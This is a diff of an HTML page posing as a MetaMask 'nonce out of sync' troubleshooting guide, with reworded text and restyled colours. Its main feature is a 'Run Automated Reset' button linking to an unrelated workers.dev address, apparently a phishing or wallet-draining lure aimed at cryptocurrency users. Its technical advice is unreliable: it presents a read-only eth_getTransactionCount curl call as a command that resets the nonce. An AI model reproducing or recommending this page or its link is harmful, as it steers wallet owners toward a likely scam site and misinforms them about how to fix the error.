@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #cf6679; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,27 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message stating "MetaMask nonce out of sync" when attempting to send a transaction on the Ethereum network, indicating a discrepancy between the expected and actual nonce values.</li>
+<li>The user encounters an error message stating "MetaMask nonce out of sync" when attempting to send a transaction on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a mismatch between the nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from concurrent transactions or network congestion.</li>
+<li>This error occurs due to a discrepancy between the expected and actual nonce values in MetaMask, which is responsible for tracking the sequence of transactions sent from a specific Ethereum account.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resync the nonce value:</li>
-<li>Delete the MetaMask extension and reinstall it</li>
-<li>Use the <code>eth_accounts</code> and <code>eth_getTransactionCount</code> JSON-RPC methods to manually retrieve the correct nonce value</li>
-<li>Execute the following command to reset the nonce:</li>
+<li>Reset the account in MetaMask to re-sync the nonce value.</li>
+<li>Manually adjust the nonce value to match the expected value.</li>
+<li>Use the following code block to reset the account nonce using the Ethereum JSON-RPC API:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>npx<span class="w"> </span>ethers.js<span class="w"> </span>--exec<span class="w"> </span><span class="s1">&#39;ethers.provider.getTransactionCount(&quot;0x...address&quot;).then(nonce =&gt; console.log(nonce))&#39;</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span>--data<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_getTransactionCount&quot;,&quot;params&quot;:[&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;,&quot;latest&quot;],&quot;id&quot;:1}&#39;</span><span class="w"> </span>https://mainnet.infura.io/v3/YOUR_PROJECT_ID
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex debugging operations.</p>
+<p>Consider using an external console for more advanced debugging and customization options.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask extension installed and configured</li>
-<li>Ethereum node or provider (e.g., Infura, Alchemy) set up</li>
-<li>Basic understanding of Ethereum JSON-RPC methods and transaction management</li>
+<li>MetaMask extension installed and configured.</li>
+<li>Ethereum account set up and funded.</li>
+<li>Basic understanding of Ethereum transaction processing and nonce values.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
